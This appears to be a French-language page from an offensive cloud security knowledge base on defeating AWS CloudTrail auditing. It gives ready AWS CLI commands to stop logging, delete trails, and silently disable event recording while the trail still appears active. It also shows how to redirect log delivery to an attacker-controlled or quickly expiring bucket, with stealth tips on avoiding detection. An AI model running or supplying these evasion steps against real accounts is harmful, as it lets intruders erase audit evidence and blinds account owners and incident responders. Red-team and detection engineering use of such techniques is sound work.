---
title: "CloudTrail : arrêter, supprimer et détourner la piste d'audit des API"
order: 1
description: "Désactiver, supprimer ou détourner des trails CloudTrail et arrêter la journalisation pour aveugler l'audit au niveau du compte."
keywords:
  - CloudTrail
  - StopLogging
  - trail
  - log tampering
  - detection evasion
---

# CloudTrail

CloudTrail est l'enregistrement de chaque appel d'API dans le compte : c'est donc la première chose qu'un opérateur dégrade pour agir sans être vu. Les leviers vont du brutal (arrêter ou supprimer le trail) au subtil (conserver le trail mais l'empêcher d'enregistrer les événements qui vous intéressent), et le bon choix dépend de la surveillance dont le trail fait l'objet et de l'endroit où ses logs atterrissent.

## Arrêter ou supprimer le trail

```bash
aws cloudtrail list-trails
aws cloudtrail stop-logging --name <trail>          # halts delivery, trail still exists
aws cloudtrail delete-trail --name <trail>          # removes it entirely
```

## Restreindre ce qu'il enregistre

Plus discret que l'arrêt : garder le trail au vert sur le tableau de bord mais supprimer les événements que vous êtes sur le point de générer.

```bash
# stop recording management and data events without deleting the trail
aws cloudtrail put-event-selectors --trail-name <trail> \
  --event-selectors '[{"ReadWriteType":"None","IncludeManagementEvents":false}]'
```

## Détourner la livraison

```bash
# point the trail at a bucket you control, or one with a 1-day lifecycle expiry
aws cloudtrail update-trail --name <trail> --s3-bucket-name <attacker-or-expiring-bucket>
```

## Notes d'exploitation

- `StopLogging`, `DeleteTrail` et `UpdateTrail` sont eux-mêmes journalisés : l'appel n'est propre que s'il atterrit avant que l'enregistrement ne soit expédié hors de votre portée, ce qui explique pourquoi les trails d'organisation livrant en cross-account sont difficiles à aveugler discrètement.
- Un trail multi-région nécessite un traitement dans chaque région ; un trail mono-région laisse les autres enregistrer.
- Les trails d'organisation créés dans le compte de gestion ne peuvent pas être arrêtés depuis un compte membre : confirmez donc où vit le trail avant de compter sur le silence.
- Préférez la restriction via `put-event-selectors` à la suppression lorsque le trail est surveillé pour son existence.

## Outils

- **AWS CLI** (`cloudtrail`) : tout ce qui précède.
- **Pacu** (`detection__disruption`) : énumère et perturbe CloudTrail, GuardDuty et Config en une seule étape.
- **Stratus Red Team** : détonations prêtes à l'emploi d'arrêt et de suppression de CloudTrail.

## Références

- [HackTricks Cloud : contournement de CloudTrail](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/aws-cloudtrail-enum.html)
- [Stratus Red Team : arrêter un trail CloudTrail](https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-stop/)
- [AWS : API StopLogging](https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html)
- [Datadog Security Labs : recherche sur le contournement de défense AWS](https://securitylabs.datadoghq.com/)
